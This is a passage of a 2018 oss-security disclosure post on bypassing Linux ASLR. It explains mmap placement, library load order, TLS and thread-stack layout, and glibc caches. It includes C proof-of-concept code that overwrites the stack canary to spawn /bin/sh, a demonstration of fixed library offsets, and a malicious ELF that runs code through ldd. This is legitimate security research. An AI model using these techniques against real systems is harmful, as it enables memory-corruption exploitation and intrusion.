@@ -1,0 +1,1127 @@
+
+Date: Tue, 27 Feb 2018 18:11:53 +0300
+From: Ilya Smith <blackzert@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: New bypass and protection techniques for ASLR on Linux
+
+Hello everybody,
+
+New bypass and protection techniques for ASLR on Linux
+
+========================================================================
+Contents
+========================================================================
+
+I. Introduction
+II. Problems with current implementation
+  II.1. Close proximity of memory location
+  II.2. Fixed method of loading libraries
+  II.3. Fixed order of execution
+  II.4. Holes
+  II.5. TLS and thread stack
+  II.6. malloc and mmap
+  II.7. MAP_FIXED and loading of ET_DYN ELF files
+  II.8. Cache of allocated memory
+  II.9. thread cache alignment
+III. Solutions
+  III.1 Holes
+  III.2 Order of loading ELF file segments 
+  III.3 Use of mmap_min_addr when searching for mmap allocation addresses 
+  III.4 mmap
+IV. Related Work
+V. References
+
+========================================================================
+I. Introduction
+========================================================================
+
+Before begin, version info:
+$ uname -a
+Linux blackzert-virtual-machine 4.13.0-36-generic #40-Ubuntu SMP Fri Feb 16 
+20:07:48 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+$ ldd --version
+ldd (Ubuntu GLIBC 2.26-0ubuntu2.1) 2.26
+
+Everything said today also true for current version of linux Kernel - 4.16-rc3
+and GNU Libc 2.27
+
+This research started with a small command:
+$ less /proc/self/maps
+
+5607a1ae5000-5607a1b0b000 r-xp 00000000 08:01 1966152   /bin/less
+5607a1d0a000-5607a1d0b000 r--p 00025000 08:01 1966152   /bin/less
+5607a1d0b000-5607a1d0f000 rw-p 00026000 08:01 1966152   /bin/less
+5607a1d0f000-5607a1d13000 rw-p 00000000 00:00 0 
+5607a3bf8000-5607a3c19000 rw-p 00000000 00:00 0         [heap]
+7f4d147e7000-7f4d14bf4000 r--p 00000000 08:01 3016021   /usr/lib/locale/locale-archive
+7f4d14bf4000-7f4d14dca000 r-xp 00000000 08:01 1179731   /lib/x86_64-linux-gnu/libc-2.26.so
+7f4d14dca000-7f4d14fca000 ---p 001d6000 08:01 1179731   /lib/x86_64-linux-gnu/libc-2.26.so
+7f4d14fca000-7f4d14fce000 r--p 001d6000 08:01 1179731   /lib/x86_64-linux-gnu/libc-2.26.so
+7f4d14fce000-7f4d14fd0000 rw-p 001da000 08:01 1179731   /lib/x86_64-linux-gnu/libc-2.26.so
+7f4d14fd0000-7f4d14fd4000 rw-p 00000000 00:00 0 
+7f4d14fd4000-7f4d14ff9000 r-xp 00000000 08:01 1185166   /lib/x86_64-linux-gnu/libtinfo.so.5.9
+7f4d14ff9000-7f4d151f8000 ---p 00025000 08:01 1185166   /lib/x86_64-linux-gnu/libtinfo.so.5.9
+7f4d151f8000-7f4d151fc000 r--p 00024000 08:01 1185166   /lib/x86_64-linux-gnu/libtinfo.so.5.9
+7f4d151fc000-7f4d151fd000 rw-p 00028000 08:01 1185166   /lib/x86_64-linux-gnu/libtinfo.so.5.9
+7f4d151fd000-7f4d15224000 r-xp 00000000 08:01 1179654   /lib/x86_64-linux-gnu/ld-2.26.so
+7f4d1540b000-7f4d15410000 rw-p 00000000 00:00 0 
+7f4d15424000-7f4d15425000 r--p 00027000 08:01 1179654   /lib/x86_64-linux-gnu/ld-2.26.so
+7f4d15425000-7f4d15426000 rw-p 00028000 08:01 1179654   /lib/x86_64-linux-gnu/ld-2.26.so
+7f4d15426000-7f4d15427000 rw-p 00000000 00:00 0 
+7ffdeb3ec000-7ffdeb40d000 rw-p 00000000 00:00 0         [stack]
+7ffdeb41e000-7ffdeb421000 r--p 00000000 00:00 0         [vvar]
+7ffdeb421000-7ffdeb423000 r-xp 00000000 00:00 0         [vdso]
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]
+
+  - The base address of the binary application (/bin/less, in our case) is 
+5607a1ae5000.
+  - The heap start address is 5607a3bf8000, being the address of the end of the 
+binary application plus a random value, which in our case equals 0x1ee5000 
+(5607a3bf8000-5607a1d13000). The address is aligned to 2^12 due to the x86-64 
+architecture.
+  - Address 7f4d15427000 is selected as mmap_base. The address will serve as 
+the upper boundary when a random address is selected for any memory allocation 
+via the mmap system call.
+  - Libraries ld-2.26.so, libtinfo.so.5.9, and libc-2.26.so are located 
+consecutively.
+
+If subtraction is applied to the neighboring memory regions, we will note the 
+following: there is a substantial difference between the binary file, heap, 
+stack, the lowest local-archive address, and the highest ld address. There is 
+not a single free page between the loaded libraries (files).
+
+If we repeat the procedure several times, the picture will remain practically 
+the same: the difference between pages will vary, while libraries and files 
+will remain identical in location relative to one another. This fact will be 
+crucial for our analysis. 
+
+Current mmap implementation is the reason of this behavior.
+
+The logic is stored in the do_mmap kernel function, which implements memory 
+allocation both on the part of the user (mmap syscall) and on the part of the 
+kernel (when executing execve). In the first stage, an available address is 
+selected ( get_unmapped_area); in the second stage, pages are mapped to that 
+address (mmap_region). We will start with the first stage. 
+
+The following options are possible when selecting an address: 
+
+  1. If the MAP_FIXED flag is set, the system will return the value of the addr 
+argument as the address.
+  2. If the addr argument value is not zero, this value is used as a hint and, 
+in some cases, will be selected. 
+  3. The largest address of an available region will be selected as the 
+address, as long as it is suitable in length and lies within the allowed range 
+of selectable addresses.
+  4. The address is checked for security-related restrictions.
+
+If all is successful, the region of memory at the selected address will be 
+allocated. 
+
+Details of address selection algorithm
+
+The structure underlying the manager of process virtual memory is 
+vm_area_struct (or vma, for short):
+  
+  struct vm_area_struct {
+      unsigned long vm_start; /* Our start address within vm_mm. */
+      unsigned long vm_end; /* The first byte after our end address
+  within vm_mm. */
+      ...
+      /* linked list of VM areas per task, sorted by address */
+      struct vm_area_struct *vm_next, *vm_prev;
+
+      struct rb_node vm_rb;
+      ...
+      pgprot_t vm_page_prot; /* Access permissions of this VMA. */
+      ...
+  };
+
+This structure describes the start of the virtual memory region, the region 
+end, and access flags for pages within the region. 
+
+vma is organized in a doubly linked list of region start addresses, in 
+ascending order, and also an augmented red-black tree of region start 
+addresses, in ascending order as well. A good rationale for this solution is 
+given by the kernel developers themselves [1].
+
+The red-black tree augment is the amount of available memory for a particular 
+node. The amount of available memory for a node is defined as whichever is the 
+highest of:
+  - The difference between the start of the current vma and end of the 
+preceding vma in an ascending-ordered doubly linked list
+  - Amount of available memory of the left-hand subtree 
+  - Amount of available memory of the right-hand subtree
+
+This structure makes it possible to quickly search (in O(log n) time) for the 
+vma that corresponds to a certain address or select an available range of a 
+certain length. 
+
+During the address selection process, two important boundaries are identified 
+as well: the minimum lower boundary and the maximum upper boundary. The lower 
+boundary is determined by the architecture as the minimum allowable address or 
+as the minimum value permitted by the system administrator. The upper 
+boundary—mmap_base—is selected as stack–random, where stack is the maximum 
+stack address while random is a random value with entropy of 28 to 32 bits, 
+depending on relevant kernel parameters. The Linux kernel cannot choose an 
+address higher than mmap_base. In the address space of the address process, 
+large mmap_base values either correspond to the stack and special system 
+regions (vvar and vdso), or will never be used unless explicitly marked with 
+the MMAP_FIXED flag. 
+
+So in this whole scheme, the following values remain unknown: the address of 
+the start of the main thread stack, the base address for loading the 
+application binary file, the start address of the application heap, and 
+mmap_base, which is the starting address for memory allocation with mmap. 
+
+========================================================================
+II. Problems with current implementation
+========================================================================
+
+The memory allocation algorithm just described has a number of weaknesses.
+
+========================================================================
+II.1. Close proximity of memory location
+========================================================================
+
+An application uses virtual RAM. Common uses of memory by an application 
+include the heap, code, and data (.rodata, .bss) of loaded modules, thread 
+stacks, and loaded files. Any mistake in processing the data from these pages 
+may affect nearby data as well. As more pages with differing types of contents 
+are located in close proximity, the attack area becomes larger and the 
+probability of successful exploitation rises. 
+
+Examples of such mistakes include out-of-bounds [2], overflow (integer [3] or 
+buffer [4], and type confusion [5]. 
+
+A specific instance of this problem is that the system remains vulnerable to 
+the Offset2lib attack, as described in [6]. In short: the base address for 
+program loading is not allocated separately from libraries, yet the kernel 
+selects it as mmap_base. If the application contains vulnerabilities, it 
+becomes easier to exploit them, because library images are located in close 
+proximity to the binary application image. 
+
+A good example demonstrating this problem is a PHP vulnerability in [7] that 
+allows reading or altering neighboring memory regions. 
+
+
+========================================================================
+II.2. Fixed method of loading libraries
+========================================================================
+
+In Linux, dynamic libraries are loaded practically without calling the Linux 
+kernel. The ld library (from GNU Libc) is in charge of this process. The only 
+way the kernel participates is via the mmap function (we will not yet consider 
+open/stat and other file operations): this is required for loading the code and 
+library data into the process address space. An exception is the ld library 
+itself, which is usually written in the executable ELF file as the interpreter 
+for file loading. As for the interpreter, it is loaded by the kernel. 
+
+If ld from GNU Libc is used as the interpreter, libraries are loaded in a way 
+resembling the following:
+
+  1. The program ELF file is added to the file queue for processing.
+  2. The first ELF file is taken out of the queue (FIFO).
+  3. If the file has not been loaded yet into the process address space, it is 
+loaded with the help of mmap.
+  4. Each library needed for the file in question is added to the queue of 
+files for processing.
+  5. As long as the queue is not empty, repeat step 2.
+
+
+This algorithm means that the order of loading is always determinate and can be 
+repeated if all the required libraries (their binary files) are known. This 
+allows recovering the addresses of all libraries if the address of any single 
+library is known:
+
+  1. Assume that the address of the libc library is known.
+  2. Add the length of the libc library to the libc loading address—this is the 
+loading address of the library that was loaded before libc.
+  3. Continuing in the same manner, we obtain mmap_base values and addresses of 
+the libraries that were loaded before libc.
+  4. Subtract from the libc address the length of the library loaded after 
+libc. This is the address of the library loaded after libc.
+  5. Iterating in the same manner, we obtain the addresses of all libraries 
+that were loaded at program start with the ld interpreter.
+
+
+If a library is loaded while the program is running (for instance, via the 
+dlopen function), its position in relation to other libraries may be unknown to 
+attackers in some cases. For example, this may happen if there were mmap calls 
+for which the size of allocated memory regions is unknown to attackers.
+
+When it comes to exploiting vulnerabilities, knowledge of library addresses 
+helps significantly: for instance, when searching for gadgets to build ROP 
+chains. What's more, if any library contains a vulnerability that allows 
+reading or writing values relative to the library address, such a vulnerability 
+will be easily exploited, since the libraries are sequential. 
+
+Most Linux distributions contain compiled packages with the most widespread 
+libraries (such as libc). This means that the length of libraries is known, 
+giving a partial picture of the distribution of virtual address space of a 
+process in such a case. 
+
+Theoretically, one could build a large database for this purpose. For Ubuntu, 
+it would contain versions of libraries including ld, libc, libpthread, and 
+libm; for each version of a library, multiple versions of libraries necessary 
+for it (dependencies) may be analyzed. So by knowing the address of one 
+library, one can know possible map versions describing the distribution of part 
+of the process address space. 
+
+Examples of such databases are libcdb.com and libc.blukat.me, which are used to 
+identify libc versions based on offsets for known functions. 
+
+All this means that a fixed method of loading libraries is an application 
+security problem. The behavior of mmap, described in the previous section, 
+compounds the problem. In Android, this problem is solved in version 7 and 
+later [8] [9]. 
+
+========================================================================
+II.3. Fixed order of execution
+========================================================================
+
+Programs have an interesting property: there is a pair of certain points in the 
+execution thread between which the program state is predictable. For example, 
+once a client has connected to a network service, the service allocates some 
+resources to the client. Part of these resources may be allocated from the 
+application heap. In this case, the relative position of objects in the heap is 
+usually predictable. 
+
+This property is useful for exploiting applications, by "building" the program 
+state required by an attacker. Here we will call this state a fixed order of 
+execution. 
+
+In some cases of this property, there is a certain fixed point in the thread of 
+execution. At this point, from the start of execution, from launch to launch, 
+the program state remains identical except for some variables. For example, 
+before the main function is executed, the ld interpreter must load and 
+initialize all the libraries and then initialize the program. As noted in 
+Section 4.2, the relative position of libraries will always be the same. During 
+execution of the main function, the differences will consist in the specific 
+addresses used for program loading, libraries, stack, heap, and objects 
+allocated in memory. These differences are due to the randomization described 
+in Section 6. 
+
+As a result, an attacker can obtain information on the relative position of 
+program data. This position is not affected by randomization of the process 
+address space. 
+
+At this stage, the only possible source of entropy is competition between 
+threads: if the program creates several threads, their competition in working 
+with the data may introduce entropy to the location of objects. In this 
+example, creating threads before executing the main function is possible with 
+the help of the program global constructors or required libraries. 
+
+When the program starts using the heap and allocating memory from it (usually 
+with the help of new/malloc), the mutual position of objects in the heap will 
+remain constant for each launch up to a certain moment. 
+
+In some cases, the position of thread and heap stacks will also be predictable 
+in relation to library addresses. 
+
+If needed, it is possible to obtain these offsets to use in exploitation. One 
+way is to simply execute "strace -e mmap" for this application twice and 
+compare the difference in addresses. 
+
+========================================================================
+II.4. Holes
+========================================================================
+
+If an application allocates memory with mmap and then frees up part of that 
+memory, this can cause holes—free memory regions that are surrounded by 
+occupied regions. Problems may come up if this free memory (hole) is again 
+allocated for a vulnerable object (a object during whose processing the 
+application demonstrates a vulnerability). This brings us back to the problem 
+of closely located objects in memory. 
+
+One illustrative example of such holes was found in the code for ELF file 
+loading in the Linux kernel. When loading the ELF file, the kernel first reads 
+the size of the file and tries to map it in full via do_mmap . Once the file 
+has been fully loaded, the memory after the first segment is freed up. All 
+following segments are loaded at a fixed address ( MAP_FIXED) that is set 
+relative to the first segment. All this is needed in order to load the entire 
+file at the selected address and separate segments by rights and offsets in 
+accordance with their descriptions in the ELF file. This approach can cause 
+memory holes if the holes were present in the ELF file between segments. 
+In the same situation, during loading of an ELF file, the ld interpreter (GNU 
+Libc) does not call unmap but changes permissions for the free pages (holes) to 
+PROT_NONE, which forbids the process from having any access to these pages. 
+This approach is more secure. 
+
+To show impact of that problem start with following command:
+$ strace -e mmap,munmap,open,openat,arch_prctl -f cat /proc/self/maps
+
+openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
+mmap(NULL, 79806, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7fa5fd8bc000
+...
+mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 
+0x7fa5fd8ba000
+arch_prctl(ARCH_SET_FS, 0x7fa5fd8bb500) = 0
+munmap(0x7fa5fd8bc000, 79806)           = 0
+...
+openat(AT_FDCWD, "/proc/self/maps", O_RDONLY) = 3
+mmap(NULL, 139264, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 
+0x7fa5fd898000
+...
+
+560d3c3e5000-560d3c3ed000 r-xp 00000000 08:01 1966104   /bin/cat
+560d3c5ec000-560d3c5ed000 r--p 00007000 08:01 1966104   /bin/cat
+560d3c5ed000-560d3c5ee000 rw-p 00008000 08:01 1966104   /bin/cat
+560d3e00b000-560d3e02c000 rw-p 00000000 00:00 0         [heap]
+7fa5fcebc000-7fa5fd2c9000 r--p 00000000 08:01 3016021   /usr/lib/locale/locale-archive
+7fa5fd2c9000-7fa5fd49f000 r-xp 00000000 08:01 1179731   /lib/x86_64-linux-gnu/libc-2.26.so
+7fa5fd49f000-7fa5fd69f000 ---p 001d6000 08:01 1179731   /lib/x86_64-linux-gnu/libc-2.26.so
+7fa5fd69f000-7fa5fd6a3000 r--p 001d6000 08:01 1179731   /lib/x86_64-linux-gnu/libc-2.26.so
+7fa5fd6a3000-7fa5fd6a5000 rw-p 001da000 08:01 1179731   /lib/x86_64-linux-gnu/libc-2.26.so
+7fa5fd6a5000-7fa5fd6a9000 rw-p 00000000 00:00 0 
+7fa5fd6a9000-7fa5fd6d0000 r-xp 00000000 08:01 1179654   /lib/x86_64-linux-gnu/ld-2.26.so
+7fa5fd898000-7fa5fd8bc000 rw-p 00000000 00:00 0 
+7fa5fd8d0000-7fa5fd8d1000 r--p 00027000 08:01 1179654   /lib/x86_64-linux-gnu/ld-2.26.so
+7fa5fd8d1000-7fa5fd8d2000 rw-p 00028000 08:01 1179654   /lib/x86_64-linux-gnu/ld-2.26.so
+7fa5fd8d2000-7fa5fd8d3000 rw-p 00000000 00:00 0 
+7ffc0a6bc000-7ffc0a6dd000 rw-p 00000000 00:00 0         [stack]
+7ffc0a730000-7ffc0a733000 r--p 00000000 00:00 0         [vvar]
+7ffc0a733000-7ffc0a735000 r-xp 00000000 00:00 0         [vdso]
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]
+munmap(0x7fa5fd898000, 139264)          = 0
++++ exited with 0 +++
+
+Here file "/etc/ld.so.cache" mmaped to the hole inside ld-2.26.so with adddress 
+0x7fa5fd8bc000. Later mmap is called to get 0x7fa5fd8ba000 address with size 
+8192. This range contain TCB (thread control block) structure of main thread, 
+set with arch_prctl(ARCH_SET_FS, 0x7fa5fd8bb500). Before 'main' function of 
+'cat' programm called, 0x7fa5fd8bc000 is unmapped leaving another one hole - 
+between TCB and ld read-only segment. 
+
+These two holes:
+  1. between ld .text and 0x7fa5fd8ba000 what is used for TCB
+  2. between 0x7fa5fd8bc000 (what is end of TCB) and ld .rdonly
+might be used to bypass ASLR, if attacker do mmap vulnerable object in these 
+holes (only appropriated size needed to do so) and use read/write out-of-bounds 
+vulnerabilities to get access to ld data or TCB or any other library data.
+
+As example '/self/proc/maps' itself mmapped in the hole - 0x7fa5fd898000.
+Another one way to mmap there is call malloc with big size - in this case glibc 
+call mmap.
+
+========================================================================
+II.5. TLS and thread stack
+========================================================================
+
+Thread Local Storage (TLS) is a mechanism whereby each thread in a multithread 
+process can allocate locations for data storage [10]. The mechanism is 
+implemented differently on different architectures and operating systems. In 
+our case, this is the glibc implementation under x86-64. For x86, any 
+difference will not be material for the mmap problem in question. 
+
+In the case of glibc, mmap is also used to create TLS. This means that TLS is 
+selected in the way described already here. If TLS is close to a vulnerable 
+object, it can be altered. 
+
+What is interesting about TLS? In the glibc implementation, TLS is pointed to 
+by the segment register fs (for the x86-64 architecture). Its structure is 
+described by the tcbhead_t type defined in glibc source files:
+
+  typedef struct
+  {
+    void *tcb;        /* Pointer to the TCB.  Not necessarily the
+                 thread descriptor used by libpthread.  */
+    dtv_t *dtv;
+    void *self;       /* Pointer to the thread descriptor.  */
+    int multiple_threads;
+    int gscope_flag;
+    uintptr_t sysinfo;
+    uintptr_t stack_guard;
+    uintptr_t pointer_guard;
+    ...
+  } tcbhead_t;
+
+This type contains the field stack_guard, which contains a so-called canary—a 
+random or pseudorandom number for protecting an application from stack 
+overflows [11].
+This protection works in the following way: when a function is entered, a 
+canary obtained from tcbhead_t.stack_guard is placed on the stack. At the end 
+of the function, the stack value is compared to the reference value in 
+tcbhead_t.stack_guard. If the two values do not match, the application will 
+return an error and terminate. 
+
+Canaries can be bypassed in several ways: 
+
+  - If an attacker does not need to overwrite this value [12].
+  - If an attacker has managed to read or anticipate this value, making it 
+possible to perform a successful attack [12].
+  - If an attacker can overwrite this value with a known one, making it 
+possible to cause a stack overflow [12].
+  - An attacker can take control before the application terminates [13].
+  - The listed bypasses highlight the importance of protecting TLS from reading 
+or overwriting by an attacker.
+
+Our research revealed that glibc has a problem in TLS implementation for 
+threads created with the help of pthread_create. Say that it is required to 
+select TLS for a new thread. After allocating memory for the stack, glibc 
+initializes TLS in upper addresses of this memory. On the x86-64 architecture 
+considered here, the stack grows downward, putting TLS at the top of the stack. 
+Subtracting a certain constant value from TLS, we obtain the value used by a 
+new thread for the stack register. The distance from TLS to the stack frame of 
+the function that the argument passed to pthread_create is less than one page. 
+Now a would-be attacker does not need to guess or peek at the canary value—the 
+attacker can just overwrite the reference value alongside with the stack value, 
+bypassing protection entirely. A similar problem was found in Intel ME [14].
+
+Here is Proof Of Concept:
+
+void pwn_payload() {
+    char *argv[2] = {"/bin/sh", 0};
+    execve(argv[0], argv, 0);
+}
+
+int fixup = 0;
+void * first(void *x)
+{
+    unsigned long *addr;
+    arch_prctl(ARCH_GET_FS, &addr);
+    printf("thread FS %p\n", addr);
+    printf("cookie thread: 0x%lx\n", addr[5]);
+    unsigned long * frame = __builtin_frame_address(0);
+    printf("stack_cookie addr %p \n", &frame[-1]);
+    printf("diff : %lx\n", (char*)addr - (char*)&frame[-1]); 
+    unsigned long len =(unsigned long)( (char*)addr - (char*)&frame[-1]) + 
+fixup;
+    // example of exploitation
+    // prepare exploit
+    void *exploit = malloc(len);
+    memset(exploit, 0x41, len);
+    void *ptr = &pwn_payload;
+    memcpy((char*)exploit + 16, &ptr, 8);
+    // exact stack-buffer overflow example
+    memcpy(&frame[-1], exploit, len);
+    return 0;
+}
+
+int main(int argc, char **argv, char **envp)
+{
+    pthread_t one;
+    unsigned long *addr;
+    void *val;
+    arch_prctl(ARCH_GET_FS, &addr);
+    if (argc > 1)
+        fixup = 0x30;
+    printf("main FS %p\n", addr);
+    printf("cookie main: 0x%lx\n", addr[5]);
+    pthread_create(&one, NULL, &first, 0);
+    pthread_join(one,&val);
+    return 0;
+}
+
+And running it:
+
+blackzert@...sher:~/aslur/tests$ ./thread_stack_tls  1
+main FS 0x7f4d94b75700
+cookie main: 0x2ad951d602d94100
+thread FS 0x7f4d94385700
+cookie thread: 0x2ad951d602d94100
+stack_cookie addr 0x7f4d94384f48
+diff : 7b8
+$ ^D
+blackzert@...sher:~/aslur/tests$
+
+`Diff` here is a size in bytes between current stack frame and TCB structure. 
+This one equals to 0x7b8 bytes what is one page less. 
+The protection against buffer overflow could be bypassed by buffer overflow.
+
+========================================================================
+II.6. malloc and mmap
+========================================================================
+
+When using malloc, sometimes glibc uses mmap for allocating new memory areas if 
+the size of requested memory is larger than a certain value. In such cases, 
+memory will be allocated with the help of mmap, so, after memory allocation, 
+the address will be close to libraries or other data allocated with mmap. 
+Attackers pay close attention to mistakes in handling of heap objects, such as 
+heap overflow, use after free [15], and type confusion [5]. 
+
+An interesting behavior of the glibc library was found when a program uses 
+pthread_create. At the first call of malloc from the thread created with 
+pthread_create, glibc will call mmap to create a new heap for this stack. So, 
+in this thread, all the addresses called via malloc will be located close to 
+the stack of this same thread.
+
+Some programs and libraries use mmap for mapping files to the address space of 
+a process. The files may be used as, for example, cache or for fast saving 
+(altering) of data on the drive. 
+
+Here is an abstract example: an application loads an MP3 file with the help of 
+mmap. Let us call the load address mmap_mp3. Then the application reads, from 
+the loaded data, the offset to the start of audio data. If the application 
+contains a mistake in its routine for verifying the length of that value, an 
+attacker may specially craft an MP3 file able to obtain access to the memory 
+region located after mmap_mp3. 
+
+Some PoC code:
+
+int main(int argc, char **argv, char **envp)
+{
+    int res;
+    system(""); // call to make lazy linking
+    execv("", NULL); // call to make lazy linking
+    unsigned long  addr = (unsigned long)mmap(0, 8 * 4096 *4096, 3, MAP_ANON | 
+MAP_PRIVATE, -1, 0);
+    if (addr == MAP_FAILED)
+        return -1;
+    unsigned long addr_system = (unsigned long)dlsym(RTLD_NEXT, "system");
+    unsigned long addr_execv = (unsigned long)dlsym(RTLD_NEXT, "execv");
+    printf("addr %lx system %lx execv %lx\n", addr, addr_system, addr_execv);
+    printf("system - addr %lx execv - addr %lx\n", addr_system - addr, 
+addr_execv - addr);
+    return 0;
+}
+
+And results:
+blackzert@...sher:~/aslur/tests$ ./mmap_libc 
+addr 7f02e9f85000 system 7f02f1fca390 execv 7f02f2051860
+system - addr 8045390 execv - addr 80cc860
+
+This shows constant offsets to library data from mmapped segment (malloced as 
+well).
+
+
+========================================================================
+II.7. MAP_FIXED and loading of ET_DYN ELF files
+========================================================================
+
+The mmap manual says the following regarding the MAP_FIXED flag: 
+
+MAP_FIXED 
+
+  Don't interpret addr as a hint: place the mapping at exactly that address. 
+addr must be a multiple of the page size. If the memory region specified by 
+addr and len overlaps pages of any existing mapping(s), then the overlapped 
+part of the existing mapping(s) will be discarded. If the specified address 
+cannot be used, mmap() will fail. Because requiring a fixed address for a 
+mapping is less portable, the use of this option is discouraged. 
+
+If the requested region with the MAP_FIXED flag overlaps existing regions, 
+successful mmap execution will overwrite existing regions. 
+
+Therefore, if a programmer makes a mistake with MAP_FIXED, existing memory 
+regions may be redefined. 
+
+An interesting example of such a mistake has been found both in the Linux 
+kernel and in glibc. 
+As described in [16], ELF files are subject to the requirement that, in the 
+Phdr header, ELF file segments must be arranged in ascending order of vaddr 
+addresses: 
+
+PT_LOAD 
+
+  The array element specifies a loadable segment, described by p_filesz and 
+p_memsz. The bytes from the file are mapped to the start of the memory segment. 
+If the segment's memory size (p_memsz) is larger than the file size (p_filesz), 
+the "extra" bytes are defined to hold the value 0 and to follow the segment's 
+initialized area. The file size may not be larger than the memory size. 
+Loadable segment entries in the program header table appear in ascending order, 
+sorted on the p_vaddr member. 
+
+However, this requirement is not checked. The current code for ELF file loading 
+is as follows: 
+
+  case PT_LOAD:
+      struct loadcmd *c = &loadcmds[nloadcmds++];
+      c->mapstart = ALIGN_DOWN (ph->p_vaddr, GLRO(dl_pagesize));
+      c->mapend = ALIGN_UP (ph->p_vaddr + ph->p_filesz, GLRO(dl_pagesize));
+  ...
+  maplength = loadcmds[nloadcmds - 1].allocend - loadcmds[0].mapstart;
+  ...
+  for (const struct loadcmd *c = loadcmds; c < &loadcmds[nloadcmds]; ++c)
+  ...
+  /* Map the segment contents from the file.  */
+  if (__glibc_unlikely (__mmap ((void *) (l->l_addr + c->mapstart),
+                    maplen, c->prot,
+                    MAP_FIXED|MAP_COPY|MAP_FILE,
+                    fd, c->mapoff)
+
+
+All segments are processed according to the following algorithm: 
+
+  1. Calculate the size of the loaded ELF file: the address of the end of the 
+last segment end, minus the start address of the first segment.
+  2. With the help of mmap, allocate memory for the entire ELF file with that 
+size, thus obtaining the base address for ELF file loading.
+  3. In the case of glibc, change access rights. If loading from the kernel, 
+release regions that create holes. Here the behavior of glibc and the Linux 
+kernel differ, as described in Section 4.4.
+  4. With the help of mmap and the MAP_FIXED flag, allocate memory for 
+remaining segments by using the address obtained by isolating the first segment 
+and adding the offset obtained from the ELF file header.
+
+This enables an intruder to create an ELF file, one of whose segments can fully 
+overwrite an existing memory region—such as the thread stack, heap, or library 
+code. 
+
+An example of a vulnerable application is the ldd tool, which is used to check 
+whether required libraries are present in the system:
+
+blackzert@...sher:~/aslur/tests/evil_elf$ ldd ./main
+    linux-vdso.so.1 =>  (0x00007ffc48545000)
+    libevil.so => ./libevil.so (0x00007fbfaf53a000)
+    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fbfaf14d000)
+    /lib64/ld-linux-x86-64.so.2 (0x000055dda45e6000)
+
+The tool uses the ld interpreter. Taking advantage of the problem with ELF file 
+loading just discussed, we succeeded in executing arbitrary code with ldd: 
+
+blackzert@...sher:~/aslur/tests/evil_elf$ ldd ./main
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+blackzert@...sher:~/aslur/tests/evil_elf$
+
+The issue of MAP_FIXED has also been raised in the Linux community previously 
+[17].
+
+========================================================================
+II.8. Cache of allocated memory
+========================================================================
+
+glibc has many different caches, of which two are interesting in the context of 
+ASLR: the cache for the stack of a newly created thread and the heap stack. The 
+stack cache works as follows: on thread termination, stack memory will not be 
+released but will be transferred to the corresponding cache. When creating a 
+thread stack, glibc first checks the cache. If the cache contains a region of 
+the required length, glibc uses that region. In this case, mmap will not be 
+accessed, and the new thread will use the previously used region with the same 
+addresses. If the attacker has successfully obtained the thread stack address, 
+and can control creation and deletion of program threads, the intruder can use 
+knowledge of the address for vulnerability exploitation. Further, if the 
+application contains uninitialized variables, their values can also be subject 
+to the attacker's control, which may lead to exploitation in some cases. 
+
+The heap cache works as follows: on thread termination, its heap moves to the 
+corresponding cache. When a heap is created again for a new thread, the cache 
+is checked first. If the cache has an available region, this region will be 
+used. In this case, everything about the stack in the previous paragraph 
+applies here as well. 
+
+Here is PoC:
+
+void * func(void *x)
+{
+    long a[1024];
+    printf("addr: %p\n", &a[0]);
+    if (x)
+        printf("value %lx\n", a[0]);
+    else
+    {
+        a[0] = 0xdeadbeef;
+        printf("value %lx\n", a[0]);
+    }
+    void * addr = malloc(32);
+    printf("malloced %p\n", addr);
+    free(addr);
+    return 0;
+}
+
+int main(int argc, char **argv, char **envp)
+{
+    int val;
+    pthread_t thread;
+    printf("thread1\n");
+    pthread_create(&thread, NULL, func, 0);
+    pthread_join(thread, &val);
+    printf("thread2\n");
+    pthread_create(&thread, NULL, func, 1);
+    pthread_join(thread, &val);
+    return 0;
+}
+
+blackzert@...sher:~/aslur/tests$ ./pthread_cache 
+thread1
+addr: 0x7fd035e04f40
+value deadbeef
+malloced <b>0x7fd030000cd0
+thread2
+addr: 0x7fd035e04f40
+value deadbeef
+malloced 0x7fd030000cd0
+
+As clearly seen, the addresses of local variables in the stack for 
+consecutively created threads remain the same. Also the same are the addresses 
+of variables allocated for them via malloc; some values of the first thread's 
+local variables are still accessible to the second thread. An attacker can use 
+this to exploit vulnerabilities of uninitialized variables [18]. Although the 
+cache speeds up the application, it also enables attackers to bypass ASLR and 
+carry out exploitation. 
+
+
+========================================================================
+II.9. thread cache alignment
+========================================================================
+
+Let us now create a thread, allocate some memory with malloc, and calculate the 
+difference from the local variable in this thread. Source code:
+
+void * first(void *x)
+{
+        int a = (int)x;
+        int *p_a = &a;
+    void *ptr;
+        ptr = malloc(8);
+    printf("%lx\n%p, %p\n", (unsigned long long)ptr - (unsigned long long)p_a, 
+ptr, p_a);
+        return 0;
+}
+
+int main()
+{
+        pthread_t one;
+        pthread_create(&one, NULL, &first, 0);
+        void *val;
+        pthread_join(one,&val);
+        return 0;
+}
+
+The first launch: 
+
+blackzert@...sher:~/aslur/tests$ ./thread_stack_small_heap
+fffffffff844e98c
+0x7f20480008c0, 0x7f204fbb1f34
+
+And the second launch:
+
+blackzert@...sher:~/aslur/tests$ ./thread_stack_small_heap
+fffffffff94a598c
+0x7fa3140008c0, 0x7fa31ab5af34
+
+In this case, the difference was not the same. Nor will it remain the same from 
+launch to launch. Let us consider the reasons for this.
+
+
+The first thing to note: the malloc-derived pointer address does not correspond 
+to the process heap address. 
+
+glibc creates a new heap for each new thread created with the help of 
